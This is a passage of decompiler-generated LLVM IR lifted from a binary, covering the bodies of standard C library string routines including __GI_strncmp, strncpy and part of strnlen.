  %v3_1001bed8 = icmp eq i32 %v1_1001bed8, 0
  br i1 %v3_1001bed8, label %dec_label_pc_1001bee0, label %dec_label_pc_1001bec8

dec_label_pc_1001bee0:                            ; preds = %dec_label_pc_1001bed4, %entry
  %v0_1001bee4 = phi i32 [ %v0_1001bec0, %entry ], [ %v1_1001bed4, %dec_label_pc_1001bed4 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1001beec

dec_label_pc_1001beec:                            ; preds = %dec_label_pc_1001bf4c, %dec_label_pc_1001beec, %dec_label_pc_1001bee0
  %v1_1001bf28 = phi i32 [ %v0_1001bee4, %dec_label_pc_1001bee0 ], [ %v1_1001bef0, %dec_label_pc_1001beec ], [ %v1_1001bef0, %dec_label_pc_1001bf4c ]
  %v1_1001beec = inttoptr i32 %v1_1001bf28 to i32*
  %v2_1001beec = load i32, i32* %v1_1001beec, align 4
  %v1_1001bef0 = add i32 %v1_1001bf28, 4
  store i32 %v1_1001bef0, i32* @r11, align 4
  %v1_1001befc = add i32 %v2_1001beec, -16843009
  %v2_1001bf00 = and i32 %v1_1001befc, -2139062144
  %v5_1001bf00 = icmp eq i32 %v2_1001bf00, 0
  br i1 %v5_1001bf00, label %dec_label_pc_1001beec, label %dec_label_pc_1001bf08

dec_label_pc_1001bf08:                            ; preds = %dec_label_pc_1001beec
  %v2_1001bf08 = inttoptr i32 %v1_1001bf28 to i8*
  %v3_1001bf08 = load i8, i8* %v2_1001bf08, align 1
  %v3_1001bf0c = icmp eq i8 %v3_1001bf08, 0
  br i1 %v3_1001bf0c, label %dec_label_pc_1001bf14, label %dec_label_pc_1001bf1c

dec_label_pc_1001bf14:                            ; preds = %dec_label_pc_1001bec8, %dec_label_pc_1001bf08
  %v1_1001bf14 = phi i32 [ %v1_1001bf28, %dec_label_pc_1001bf08 ], [ %v0_1001bed4, %dec_label_pc_1001bec8 ]
  %v2_1001bf14 = sub i32 %v1_1001bf14, %v0_1001bec0
  ret i32 %v2_1001bf14

dec_label_pc_1001bf1c:                            ; preds = %dec_label_pc_1001bf08
  %v1_1001bf1c = add i32 %v1_1001bf28, 1
  %v2_1001bf1c = inttoptr i32 %v1_1001bf1c to i8*
  %v3_1001bf1c = load i8, i8* %v2_1001bf1c, align 1
  %v3_1001bf20 = icmp eq i8 %v3_1001bf1c, 0
  br i1 %v3_1001bf20, label %dec_label_pc_1001bf28, label %dec_label_pc_1001bf34

dec_label_pc_1001bf28:                            ; preds = %dec_label_pc_1001bf1c
  %v2_1001bf28 = sub i32 %v1_1001bf28, %v0_1001bec0
  %v1_1001bf2c = add i32 %v2_1001bf28, 1
  ret i32 %v1_1001bf2c

dec_label_pc_1001bf34:                            ; preds = %dec_label_pc_1001bf1c
  %v1_1001bf34 = add i32 %v1_1001bf28, 2
  %v2_1001bf34 = inttoptr i32 %v1_1001bf34 to i8*
  %v3_1001bf34 = load i8, i8* %v2_1001bf34, align 1
  %v3_1001bf38 = icmp eq i8 %v3_1001bf34, 0
  br i1 %v3_1001bf38, label %dec_label_pc_1001bf40, label %dec_label_pc_1001bf4c

dec_label_pc_1001bf40:                            ; preds = %dec_label_pc_1001bf34
  %v2_1001bf40 = sub i32 %v1_1001bf28, %v0_1001bec0
  %v1_1001bf44 = add i32 %v2_1001bf40, 2
  ret i32 %v1_1001bf44

dec_label_pc_1001bf4c:                            ; preds = %dec_label_pc_1001bf34
  %v1_1001bf4c = add i32 %v1_1001bf28, 3
  %v2_1001bf4c = inttoptr i32 %v1_1001bf4c to i8*
  %v3_1001bf4c = load i8, i8* %v2_1001bf4c, align 1
  %v3_1001bf50 = icmp eq i8 %v3_1001bf4c, 0
  br i1 %v3_1001bf50, label %dec_label_pc_1001bf58, label %dec_label_pc_1001beec

dec_label_pc_1001bf58:                            ; preds = %dec_label_pc_1001bf4c
  %v2_1001bf58 = sub i32 %v1_1001bf28, %v0_1001bec0
  %v1_1001bf5c = add i32 %v2_1001bf58, 3
  ret i32 %v1_1001bf5c

; uselistorder directives
  uselistorder i32 %v1_1001bef0, { 2, 1, 0 }
  uselistorder i32 %v1_1001bf28, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1001bed4, { 1, 0, 2 }
  uselistorder i32 %v0_1001bec0, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_1001bf14, { 1, 0 }
  uselistorder label %dec_label_pc_1001bec8, { 1, 0 }
}

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r11, align 4
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_1001c03c, label %dec_label_pc_1001bf78

dec_label_pc_1001bf78:                            ; preds = %entry
  %v1_1001bf78 = udiv i32 %arg2, 4
  %v0_1001bf88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001bf80

dec_label_pc_1001bf80:                            ; preds = %dec_label_pc_1001c008, %dec_label_pc_1001bf78
  %v0_1001c008 = phi i32 [ %v1_1001c008, %dec_label_pc_1001c008 ], [ %v1_1001bf78, %dec_label_pc_1001bf78 ]
  %v0_1001bfa0 = phi i32 [ %v1_1001bfc4, %dec_label_pc_1001c008 ], [ %v0_1001bf88.pre, %dec_label_pc_1001bf78 ]
  %v0_1001bf9c = phi i32 [ %v1_1001bfb8, %dec_label_pc_1001c008 ], [ %tmp, %dec_label_pc_1001bf78 ]
  %v1_1001bf80 = inttoptr i32 %v0_1001bf9c to i8*
  %v2_1001bf80 = load i8, i8* %v1_1001bf80, align 1
  %v1_1001bf88 = inttoptr i32 %v0_1001bfa0 to i8*
  %v2_1001bf88 = load i8, i8* %v1_1001bf88, align 1
  %v3_1001bf8c = icmp eq i8 %v2_1001bf80, 0
  %v4_1001bf90.not = icmp ne i8 %v2_1001bf80, %v2_1001bf88
  %brmerge = or i1 %v3_1001bf8c, %v4_1001bf90.not
  br i1 %brmerge, label %dec_label_pc_1001bfe8, label %dec_label_pc_1001bf9c

dec_label_pc_1001bf9c:                            ; preds = %dec_label_pc_1001bf80
  %v1_1001bf84 = add i32 %v0_1001bf9c, 1
  %v2_1001bf9c = inttoptr i32 %v1_1001bf84 to i8*
  %v3_1001bf9c = load i8, i8* %v2_1001bf9c, align 1
  %v1_1001bfa0 = add i32 %v0_1001bfa0, 1
  store i32 %v1_1001bfa0, i32* @r10, align 4
  %v2_1001bfa4 = inttoptr i32 %v1_1001bfa0 to i8*
  %v3_1001bfa4 = load i8, i8* %v2_1001bfa4, align 1
  %v1_1001bfa8 = add i32 %v0_1001bf9c, 2
  store i32 %v1_1001bfa8, i32* @r8, align 4
  %v3_1001bfb4 = icmp eq i8 %v3_1001bf9c, 0
  %v1_1001bfb8 = add i32 %v0_1001bf9c, 4
  store i32 %v1_1001bfb8, i32* @r11, align 4
  %v1_1001bfbc = add i32 %v0_1001bfa0, 3
  %v1_1001bfc4 = add i32 %v0_1001bfa0, 4
  store i32 %v1_1001bfc4, i32* @r4, align 4
  %v4_1001bfc0.not = icmp ne i8 %v3_1001bf9c, %v3_1001bfa4
  %brmerge20 = or i1 %v3_1001bfb4, %v4_1001bfc0.not
  br i1 %brmerge20, label %dec_label_pc_1001bfe8, label %dec_label_pc_1001bfd0

dec_label_pc_1001bfd0:                            ; preds = %dec_label_pc_1001bf9c
  %v1_1001bfb0 = add i32 %v0_1001bfa0, 2
  %v2_1001bfd0 = inttoptr i32 %v1_1001bfa8 to i8*
  %v3_1001bfd0 = load i8, i8* %v2_1001bfd0, align 1
  %v2_1001bfd4 = inttoptr i32 %v1_1001bfb0 to i8*
  %v3_1001bfd4 = load i8, i8* %v2_1001bfd4, align 1
  %v3_1001bfd8 = icmp eq i8 %v3_1001bfd0, 0
  %v4_1001bfdc.not = icmp ne i8 %v3_1001bfd0, %v3_1001bfd4
  %brmerge1 = or i1 %v3_1001bfd8, %v4_1001bfdc.not
  br i1 %brmerge1, label %dec_label_pc_1001bfe8, label %dec_label_pc_1001bff0

dec_label_pc_1001bfe8:                            ; preds = %dec_label_pc_1001bf9c, %dec_label_pc_1001bfd0, %dec_label_pc_1001bf80
  %v1_1001bfe8.in = phi i8 [ %v3_1001bfd0, %dec_label_pc_1001bfd0 ], [ %v2_1001bf80, %dec_label_pc_1001bf80 ], [ %v3_1001bf9c, %dec_label_pc_1001bf9c ]
  %v0_1001bfe8.in = phi i8 [ %v3_1001bfd4, %dec_label_pc_1001bfd0 ], [ %v2_1001bf88, %dec_label_pc_1001bf80 ], [ %v3_1001bfa4, %dec_label_pc_1001bf9c ]
  %v0_1001bfe8 = zext i8 %v0_1001bfe8.in to i32
  %v1_1001bfe8 = zext i8 %v1_1001bfe8.in to i32
  %v2_1001bfe8 = sub nsw i32 %v1_1001bfe8, %v0_1001bfe8
  ret i32 %v2_1001bfe8

dec_label_pc_1001bff0:                            ; preds = %dec_label_pc_1001bfd0
  %v1_1001bff0 = add i32 %v0_1001bf9c, 3
  %v2_1001bff0 = inttoptr i32 %v1_1001bff0 to i8*
  %v3_1001bff0 = load i8, i8* %v2_1001bff0, align 1
  %v4_1001bff0 = zext i8 %v3_1001bff0 to i32
  %v2_1001bff4 = inttoptr i32 %v1_1001bfbc to i8*
  %v3_1001bff4 = load i8, i8* %v2_1001bff4, align 1
  %v4_1001bff4 = zext i8 %v3_1001bff4 to i32
  %v3_1001bff8 = icmp eq i8 %v3_1001bff0, 0
  %v4_1001bffc.not = icmp ne i8 %v3_1001bff0, %v3_1001bff4
  %brmerge2 = or i1 %v3_1001bff8, %v4_1001bffc.not
  br i1 %brmerge2, label %dec_label_pc_1001c034, label %dec_label_pc_1001c008

dec_label_pc_1001c008:                            ; preds = %dec_label_pc_1001bff0
  %v1_1001c008 = add i32 %v0_1001c008, -1
  %v2_1001c008 = icmp eq i32 %v1_1001c008, 0
  br i1 %v2_1001c008, label %dec_label_pc_1001c00c, label %dec_label_pc_1001bf80

dec_label_pc_1001c00c:                            ; preds = %dec_label_pc_1001c008
  %v1_1001c00c = urem i32 %arg2, 4
  br label %dec_label_pc_1001c03c

dec_label_pc_1001c014:                            ; preds = %dec_label_pc_1001c044
  %v1_1001c014 = inttoptr i32 %v0_1001c014 to i8*
  %v2_1001c014 = load i8, i8* %v1_1001c014, align 1
  %v3_1001c014 = zext i8 %v2_1001c014 to i32
  %v1_1001c018 = add i32 %v0_1001c014, 1
  store i32 %v1_1001c018, i32* @r11, align 4
  %v0_1001c01c = load i32, i32* @r4, align 4
  %v1_1001c01c = inttoptr i32 %v0_1001c01c to i8*
  %v2_1001c01c = load i8, i8* %v1_1001c01c, align 1
  %v3_1001c01c = zext i8 %v2_1001c01c to i32
  %v1_1001c020 = add i32 %v0_1001c01c, 1
  store i32 %v1_1001c020, i32* @r4, align 4
  %v3_1001c024 = icmp eq i8 %v2_1001c014, 0
  %v4_1001c028.not = icmp ne i8 %v2_1001c014, %v2_1001c01c
  %brmerge3 = or i1 %v3_1001c024, %v4_1001c028.not
  br i1 %brmerge3, label %dec_label_pc_1001c034, label %dec_label_pc_1001c044

dec_label_pc_1001c034:                            ; preds = %dec_label_pc_1001bff0, %dec_label_pc_1001c014
  %v1_1001c034 = phi i32 [ %v3_1001c014, %dec_label_pc_1001c014 ], [ %v4_1001bff0, %dec_label_pc_1001bff0 ]
  %v0_1001c034 = phi i32 [ %v3_1001c01c, %dec_label_pc_1001c014 ], [ %v4_1001bff4, %dec_label_pc_1001bff0 ]
  %v2_1001c034 = sub nsw i32 %v1_1001c034, %v0_1001c034
  ret i32 %v2_1001c034

dec_label_pc_1001c03c:                            ; preds = %entry, %dec_label_pc_1001c00c
  %v1_1001c04819 = phi i32 [ 0, %entry ], [ %v4_1001bff0, %dec_label_pc_1001c00c ]
  %v0_1001c04817 = phi i32 [ 0, %entry ], [ %v4_1001bff4, %dec_label_pc_1001c00c ]
  %v0_1001c01413 = phi i32 [ %tmp, %entry ], [ %v1_1001bfb8, %dec_label_pc_1001c00c ]
  %v0_1001c03c = phi i32 [ %arg2, %entry ], [ %v1_1001c00c, %dec_label_pc_1001c00c ]
  %v1_1001c03c = add i32 %v0_1001c03c, 1
  br label %dec_label_pc_1001c044

dec_label_pc_1001c044:                            ; preds = %dec_label_pc_1001c014, %dec_label_pc_1001c03c
  %v1_1001c048 = phi i32 [ %v3_1001c014, %dec_label_pc_1001c014 ], [ %v1_1001c04819, %dec_label_pc_1001c03c ]
  %v0_1001c048 = phi i32 [ %v3_1001c01c, %dec_label_pc_1001c014 ], [ %v0_1001c04817, %dec_label_pc_1001c03c ]
  %v0_1001c014 = phi i32 [ %v1_1001c018, %dec_label_pc_1001c014 ], [ %v0_1001c01413, %dec_label_pc_1001c03c ]
  %v0_1001c044 = phi i32 [ %v1_1001c044, %dec_label_pc_1001c014 ], [ %v1_1001c03c, %dec_label_pc_1001c03c ]
  %v1_1001c044 = add i32 %v0_1001c044, -1
  %v2_1001c044 = icmp eq i32 %v1_1001c044, 0
  br i1 %v2_1001c044, label %dec_label_pc_1001c048, label %dec_label_pc_1001c014

dec_label_pc_1001c048:                            ; preds = %dec_label_pc_1001c044
  %v2_1001c048 = sub nsw i32 %v1_1001c048, %v0_1001c048
  ret i32 %v2_1001c048

; uselistorder directives
  uselistorder i32 %v1_1001c044, { 1, 0 }
  uselistorder i32 %v3_1001c01c, { 1, 0 }
  uselistorder i32 %v3_1001c014, { 1, 0 }
  uselistorder i32 %v1_1001c008, { 1, 0 }
  uselistorder i32 %v4_1001bff4, { 1, 0 }
  uselistorder i32 %v4_1001bff0, { 1, 0 }
  uselistorder i32 %v1_1001bfc4, { 1, 0 }
  uselistorder i32 %v1_1001bfb8, { 0, 2, 1 }
  uselistorder i32 %v0_1001bf9c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001bfa0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001c044, { 1, 0 }
  uselistorder label %dec_label_pc_1001c03c, { 1, 0 }
  uselistorder label %dec_label_pc_1001c034, { 1, 0 }
  uselistorder label %dec_label_pc_1001bfe8, { 1, 0, 2 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v3_1001c050 = icmp eq i32 %arg2, 3
  store i1 %v3_1001c050, i1* %cr7_eq.global-to-local, align 1
  %v1_1001c054 = add i32 %arg1, -1
  store i32 %v1_1001c054, i32* %r10.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1001c0d0, label %dec_label_pc_1001c05c

dec_label_pc_1001c05c:                            ; preds = %entry
  %v1_1001c05c = udiv i32 %arg2, 4
  store i32 %v1_1001c05c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001c064

dec_label_pc_1001c064:                            ; preds = %dec_label_pc_1001c0b4, %dec_label_pc_1001c05c
  %v2_1001c074 = phi i32 [ %v3_1001c0ac, %dec_label_pc_1001c0b4 ], [ %v1_1001c054, %dec_label_pc_1001c05c ]
  %v0_1001c064 = load i32, i32* @r4, align 4
  %v1_1001c064 = inttoptr i32 %v0_1001c064 to i8*
  %v2_1001c064 = load i8, i8* %v1_1001c064, align 1
  %v1_1001c068 = add i32 %v0_1001c064, 1
  store i32 %v1_1001c068, i32* %r11.global-to-local, align 4
  %v1_1001c06c = add i32 %v0_1001c064, 2
  store i32 %v1_1001c06c, i32* @r8, align 4
  %v3_1001c070 = icmp eq i8 %v2_1001c064, 0
  store i1 %v3_1001c070, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c074 = add i32 %v2_1001c074, 1
  %v4_1001c074 = inttoptr i32 %v3_1001c074 to i8*
  store i8 %v2_1001c064, i8* %v4_1001c074, align 1
  store i32 %v3_1001c074, i32* %r10.global-to-local, align 4
  %v0_1001c078 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c078, label %dec_label_pc_1001c0bc, label %dec_label_pc_1001c07c

dec_label_pc_1001c07c:                            ; preds = %dec_label_pc_1001c064
  %v0_1001c07c = load i32, i32* @r4, align 4
  %v1_1001c07c = add i32 %v0_1001c07c, 1
  %v2_1001c07c = inttoptr i32 %v1_1001c07c to i8*
  %v3_1001c07c = load i8, i8* %v2_1001c07c, align 1
  %v0_1001c080 = load i32, i32* @r8, align 4
  %v1_1001c084 = add i32 %v0_1001c080, 2
  store i32 %v1_1001c084, i32* @r4, align 4
  %v3_1001c088 = icmp eq i8 %v3_1001c07c, 0
  store i1 %v3_1001c088, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c08c = add i32 %v2_1001c074, 2
  %v4_1001c08c = inttoptr i32 %v3_1001c08c to i8*
  store i8 %v3_1001c07c, i8* %v4_1001c08c, align 1
  store i32 %v3_1001c08c, i32* %r10.global-to-local, align 4
  %v0_1001c090 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c090, label %dec_label_pc_1001c0bc, label %dec_label_pc_1001c094

dec_label_pc_1001c094:                            ; preds = %dec_label_pc_1001c07c
  %v0_1001c094 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001c094 = add i32 %v0_1001c094, 1
  %v2_1001c094 = inttoptr i32 %v1_1001c094 to i8*
  %v3_1001c094 = load i8, i8* %v2_1001c094, align 1
  %v3_1001c098 = icmp eq i8 %v3_1001c094, 0
  store i1 %v3_1001c098, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c09c = add i32 %v2_1001c074, 3
  %v4_1001c09c = inttoptr i32 %v3_1001c09c to i8*
  store i8 %v3_1001c094, i8* %v4_1001c09c, align 1
  store i32 %v3_1001c09c, i32* %r10.global-to-local, align 4
  %v0_1001c0a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c0a0, label %dec_label_pc_1001c0bc, label %dec_label_pc_1001c0a4

dec_label_pc_1001c0a4:                            ; preds = %dec_label_pc_1001c094
  %v0_1001c0a4 = load i32, i32* @r8, align 4
  %v1_1001c0a4 = add i32 %v0_1001c0a4, 1
  %v2_1001c0a4 = inttoptr i32 %v1_1001c0a4 to i8*
  %v3_1001c0a4 = load i8, i8* %v2_1001c0a4, align 1
  %v3_1001c0a8 = icmp eq i8 %v3_1001c0a4, 0
  store i1 %v3_1001c0a8, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c0ac = add i32 %v2_1001c074, 4
  %v4_1001c0ac = inttoptr i32 %v3_1001c0ac to i8*
  store i8 %v3_1001c0a4, i8* %v4_1001c0ac, align 1
  store i32 %v3_1001c0ac, i32* %r10.global-to-local, align 4
  %v0_1001c0b0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c0b0, label %dec_label_pc_1001c0bc, label %dec_label_pc_1001c0b4

dec_label_pc_1001c0b4:                            ; preds = %dec_label_pc_1001c0a4
  %v0_1001c0b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c0b4 = add i32 %v0_1001c0b4, -1
  store i32 %v1_1001c0b4, i32* %ctr.global-to-local, align 4
  %v2_1001c0b4 = icmp eq i32 %v1_1001c0b4, 0
  br i1 %v2_1001c0b4, label %dec_label_pc_1001c0d0, label %dec_label_pc_1001c064

dec_label_pc_1001c0bc:                            ; preds = %dec_label_pc_1001c0a4, %dec_label_pc_1001c094, %dec_label_pc_1001c07c, %dec_label_pc_1001c064
  %v1_1001c0bc = phi i32 [ %v3_1001c0ac, %dec_label_pc_1001c0a4 ], [ %v3_1001c09c, %dec_label_pc_1001c094 ], [ %v3_1001c08c, %dec_label_pc_1001c07c ], [ %v3_1001c074, %dec_label_pc_1001c064 ]
  %v2_1001c0bc11 = sub i32 %arg1, %v1_1001c0bc
  %v2_1001c0c0 = add i32 %v2_1001c0bc11, %arg2
  %v1_1001c0c4 = add i32 %v2_1001c0c0, -1
  store i32 %v1_1001c0c4, i32* %r11.global-to-local, align 4
  %v4_1001c0c4 = icmp eq i32 %v1_1001c0c4, 0
  %v0_1001c0c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001c0c4, i32 %v0_1001c0c8)
  %v2_1001c100.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c0f8

dec_label_pc_1001c0d0:                            ; preds = %dec_label_pc_1001c0b4, %entry
  %v1_1001c0d0 = urem i32 %arg2, 4
  store i32 %v1_1001c0d0, i32* %r11.global-to-local, align 4
  %v3_1001c0d0 = icmp eq i32 %v1_1001c0d0, 0
  %v0_1001c0d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c0d0, i32 %v0_1001c0d4)
  store i32 %v1_1001c0d0, i32* %ctr.global-to-local, align 4
  %v2_1001c0ec.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c0dc

dec_label_pc_1001c0dc:                            ; preds = %dec_label_pc_1001c0f4.dec_label_pc_1001c0dc_crit_edge, %dec_label_pc_1001c0d0
  %v2_1001c0ec = phi i32 [ %v3_1001c0ec, %dec_label_pc_1001c0f4.dec_label_pc_1001c0dc_crit_edge ], [ %v2_1001c0ec.pre, %dec_label_pc_1001c0d0 ]
  %v0_1001c0e0 = phi i32 [ %v0_1001c0e0.pre, %dec_label_pc_1001c0f4.dec_label_pc_1001c0dc_crit_edge ], [ %v1_1001c0d0, %dec_label_pc_1001c0d0 ]
  %v0_1001c0dc = load i32, i32* @r4, align 4
  %v1_1001c0dc = inttoptr i32 %v0_1001c0dc to i8*
  %v2_1001c0dc = load i8, i8* %v1_1001c0dc, align 1
  %v1_1001c0e0 = add i32 %v0_1001c0e0, -1
  store i32 %v1_1001c0e0, i32* %r11.global-to-local, align 4
  %v1_1001c0e4 = add i32 %v0_1001c0dc, 1
  store i32 %v1_1001c0e4, i32* @r4, align 4
  %v3_1001c0e8 = icmp eq i8 %v2_1001c0dc, 0
  store i1 %v3_1001c0e8, i1* %cr7_eq.global-to-local, align 1
  %v3_1001c0ec = add i32 %v2_1001c0ec, 1
  %v4_1001c0ec = inttoptr i32 %v3_1001c0ec to i8*
  store i8 %v2_1001c0dc, i8* %v4_1001c0ec, align 1
  store i32 %v3_1001c0ec, i32* @r10, align 4
  %v0_1001c0f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c0f0 = add i32 %v0_1001c0f0, -1
  store i32 %v1_1001c0f0, i32* %ctr.global-to-local, align 4
  %v2_1001c0f0 = icmp eq i32 %v1_1001c0f0, 0
  br i1 %v2_1001c0f0, label %dec_label_pc_1001c108, label %dec_label_pc_1001c0f4

dec_label_pc_1001c0f4:                            ; preds = %dec_label_pc_1001c0dc
  %v0_1001c0f4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001c0f4, label %dec_label_pc_1001c0f8, label %dec_label_pc_1001c0f4.dec_label_pc_1001c0dc_crit_edge

dec_label_pc_1001c0f4.dec_label_pc_1001c0dc_crit_edge: ; preds = %dec_label_pc_1001c0f4
  %v0_1001c0e0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c0dc

dec_label_pc_1001c0f8:                            ; preds = %dec_label_pc_1001c0f4, %dec_label_pc_1001c0bc
  %v2_1001c100.pre = phi i32 [ %v2_1001c100.pre.pre, %dec_label_pc_1001c0bc ], [ %v3_1001c0ec, %dec_label_pc_1001c0f4 ]
  %v0_1001c0f8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001c0f8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001c0fc

dec_label_pc_1001c0fc:                            ; preds = %dec_label_pc_1001c0fc, %dec_label_pc_1001c0f8
  %v2_1001c100 = phi i32 [ %v3_1001c100, %dec_label_pc_1001c0fc ], [ %v2_1001c100.pre, %dec_label_pc_1001c0f8 ]
  %v3_1001c100 = add i32 %v2_1001c100, 1
  %v4_1001c100 = inttoptr i32 %v3_1001c100 to i8*
  store i8 0, i8* %v4_1001c100, align 1
  store i32 %v3_1001c100, i32* @r10, align 4
  %v0_1001c104 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001c104 = add i32 %v0_1001c104, -1
  store i32 %v1_1001c104, i32* %ctr.global-to-local, align 4
  %v2_1001c104 = icmp eq i32 %v1_1001c104, 0
  br i1 %v2_1001c104, label %dec_label_pc_1001c108, label %dec_label_pc_1001c0fc

dec_label_pc_1001c108:                            ; preds = %dec_label_pc_1001c0dc, %dec_label_pc_1001c0fc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1001c104, { 1, 0 }
  uselistorder i32 %v3_1001c100, { 1, 2, 0 }
  uselistorder i32 %v1_1001c0f0, { 1, 0 }
  uselistorder i32 %v3_1001c0ec, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001c0d0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001c0b4, { 1, 0 }
  uselistorder i32 %v3_1001c0ac, { 0, 2, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 5, 3, 0, 1, 2, 4, 6 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001c108, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001c10c = load i32, i32* @r4, align 4
  %v3_1001c10c = icmp eq i32 %v0_1001c10c, 0
  store i32 %tmp, i32* @r8, align 4
  %v0_1001c118 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c10c, i32 %v0_1001c118)
  %v0_1001c128 = load i32, i32* @r8, align 4
  %v1_1001c128 = load i32, i32* @r4, align 4
  %v2_1001c128 = add i32 %v1_1001c128, %v0_1001c128
  %v3_1001c12c = icmp ugt i32 %v2_1001c128, %v0_1001c128
  %v4_1001c12c = icmp eq i32 %v1_1001c128, 0
  %v2_1001c130 = or i1 %v4_1001c12c, %v3_1001c12c
  br i1 %v2_1001c130, label %dec_label_pc_1001c138, label %dec_label_pc_1001c134

dec_label_pc_1001c120:                            ; preds = %dec_label_pc_1001c1a0
  store i32 %v0_1001c120, i32* @r10, align 4
  br label %dec_label_pc_1001c1e4

dec_label_pc_1001c134:                            ; preds = %entry
  br label %dec_label_pc_1001c138

dec_label_pc_1001c138:                            ; preds = %entry, %dec_label_pc_1001c134
  %v0_1001c1e8 = phi i32 [ %v2_1001c128, %entry ], [ -1, %dec_label_pc_1001c134 ]
  store i32 %v0_1001c128, i32* @r10, align 4
  %v1_1001c1686 = urem i32 %v0_1001c128, 4
  %v3_1001c1688 = icmp eq i32 %v1_1001c1686, 0
  br i1 %v3_1001c1688, label %dec_label_pc_1001c170, label %dec_label_pc_1001c140

dec_label_pc_1001c140:                            ; preds = %dec_label_pc_1001c138, %dec_label_pc_1001c164
  %v0_1001c158 = phi i32 [ %v1_1001c164, %dec_label_pc_1001c164 ], [ %v0_1001c128, %dec_label_pc_1001c138 ]
  %v1_1001c140 = inttoptr i32 %v0_1001c158 to i8*
  %v2_1001c140 = load i8, i8* %v1_1001c140, align 1
  %v3_1001c144 = icmp eq i8 %v2_1001c140, 0
  br i1 %v3_1001c144, label %dec_label_pc_1001c14c, label %dec_label_pc_1001c164

dec_label_pc_1001c14c:                            ; preds = %dec_label_pc_1001c140
  %v3_1001c14c = icmp ugt i32 %v0_1001c1e8, %v0_1001c158
  %v0_1001c158.v0_1001c1e8 = select i1 %v3_1001c14c, i32 %v0_1001c158, i32 %v0_1001c1e8
  %v2_1001c15c = sub i32 %v0_1001c158.v0_1001c1e8, %v0_1001c128
  ret i32 %v2_1001c15c

dec_label_pc_1001c164:                            ; preds = %dec_label_pc_1001c140
  %v1_1001c164 = add i32 %v0_1001c158, 1
  store i32 %v1_1001c164, i32* @r10, align 4
  %v1_1001c168 = urem i32 %v1_1001c164, 4
  %v3_1001c168 = icmp eq i32 %v1_1001c168, 0
  br i1 %v3_1001c168, label %dec_label_pc_1001c170, label %dec_label_pc_1001c140

dec_label_pc_1001c170:                            ; preds = %dec_label_pc_1001c164, %dec_label_pc_1001c138
  %v0_1001c174 = phi i32 [ %v0_1001c128, %dec_label_pc_1001c138 ], [ %v1_1001c164, %dec_label_pc_1001c164 ]
  store i32 %v0_1001c174, i32* @r11, align 4
  %v2_1001c1dc3 = icmp ult i32 %v0_1001c174, %v0_1001c1e8
  br i1 %v2_1001c1dc3, label %dec_label_pc_1001c180, label %dec_label_pc_1001c1e4

dec_label_pc_1001c180:                            ; preds = %dec_label_pc_1001c170, %dec_label_pc_1001c1d8
  %v0_1001c120 = phi i32 [ %v1_1001c184, %dec_label_pc_1001c1d8 ], [ %v0_1001c174, %dec_label_pc_1001c170 ]
  %v1_1001c180 = inttoptr i32 %v0_1001c120 to i32*
  %v2_1001c180 = load i32, i32* %v1_1001c180, align 4
  %v1_1001c184 = add i32 %v0_1001c120, 4
  store i32 %v1_1001c184, i32* @r11, align 4
  %v1_1001c18c = add i32 %v0_1001c120, 1
  store i32 %v1_1001c18c, i32* @r10, align 4
  %v1_1001c194 = add i32 %v2_1001c180, -16843009
  %v2_1001c198 = and i32 %v1_1001c194, -2139062144
  %v5_1001c198 = icmp eq i32 %v2_1001c198, 0
  br i1 %v5_1001c198, label %dec_label_pc_1001c1d8, label %dec_label_pc_1001c1a0

dec_label_pc_1001c1a0:                            ; preds = %dec_label_pc_1001c180
